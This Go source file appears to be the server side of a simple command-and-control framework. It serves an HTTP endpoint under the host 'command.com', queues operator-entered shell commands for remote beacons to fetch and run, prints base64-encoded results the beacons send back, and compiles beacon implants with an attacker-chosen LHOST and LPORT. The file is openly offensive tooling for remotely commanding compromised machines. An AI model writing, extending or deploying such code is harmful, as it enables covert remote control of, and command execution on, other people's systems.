package main

import (
	"github.com/gorilla/mux"
	"fmt"
	"time"
	"log"
	"encoding/json"
	"net/http"
	"strconv"
	"os"
	"os/exec"
	"strings"
	"bufio"
	b64 "encoding/base64"
)

type CommandUpdate struct {
	Ip string
	Type string
	Data string
}

var execBuffer []string = make([]string, 0)
var cmdArgs = map[string]string {
    "help": "",
    "exec": "<command>",
    "create": "<LHOST> <LPORT>",
}

// to serve management interface
func interfaceHandler(w http.ResponseWriter, h *http.Request) {
	json.NewEncoder(w).Encode(map[string]bool{"ok": true})
}

// respond to client requests
func commandHandler(w http.ResponseWriter, h *http.Request) {
	respMap := make(map[string][]string)
	if execBuffer != nil {
		respMap["exec"] = execBuffer
	}
	json.NewEncoder(w).Encode(respMap)
	execBuffer = nil
}

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	data := mux.Vars(r)["data"]
	decoded, _ := b64.StdEncoding.DecodeString(data)
	var update CommandUpdate
	json.Unmarshal(decoded, &update)

	if len(update.Data) > 0 {
		out := strings.Replace(update.Data, "\n", "\n\t", -1)
		fmt.Println("\n[+] Beacon " + update.Ip + " " + update.Type + ":")
		fmt.Print("\t" + out[:len(out)-1] + "c2> ")
	}
}

func startServerRoutine() {
	var router = mux.NewRouter()
	router.HandleFunc("/", interfaceHandler).Host("localhost")
	router.HandleFunc("/update", commandHandler).Host("command.com").Methods("Get")
	router.HandleFunc("/{data}", beaconHandler).Host("command.com").Methods("Get")

	srv := &http.Server{
        Handler:      router,
        Addr:         "127.0.0.1:8001",
        WriteTimeout: 15 * time.Second,
        ReadTimeout:  15 * time.Second,
    }

	go func() {
    	log.Fatal(srv.ListenAndServe())	
	}()
}

func createBeacon(lhost string, lport string) {
	exec.Command("/bin/sh", "-c", "rm out/*").Output()
	exec.Command("/bin/sh", "-c", "go build -ldflags '-X main.cmdAddress=" + lhost + " -X main.cmdPort=" + lport + " -X main.cmdHost=command.com' -o out/beacon beacon/beacon.go").Output()
	fmt.Println("Created beacon in out directory.")
}

func checkArgs(cmd[] string) (bool) {
	amt := len(strings.Fields(cmdArgs[cmd[0]]))
	if len(cmd[1:]) != amt {
		if amt == 1 {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " arg: " + cmdArgs[cmd[0]])
		} else {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " args: " + cmdArgs[cmd[0]])
		}
		return false
	}
	return true
}

func processInput(input string) {
	cmd := strings.Fields(input);
	if checkArgs(cmd) {
		switch cmd[0] {
		case "exec":
			fmt.Println("Adding exec command to buffer.")
			execBuffer = append(execBuffer, strings.Join(cmd[1:], " "))
		case "create":
			createBeacon(cmd[1], cmd[2])
		case "help":
			//printHelp(cmd[1:])
		}
	}
}

func handleInput() {
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("c2> ")
		input, err := reader.ReadString('\n')
        if err != nil {
            fmt.Fprintln(os.Stderr, err)
        }

		processInput(input)
	}
}

func main() {
	startServerRoutine()
	handleInput()
}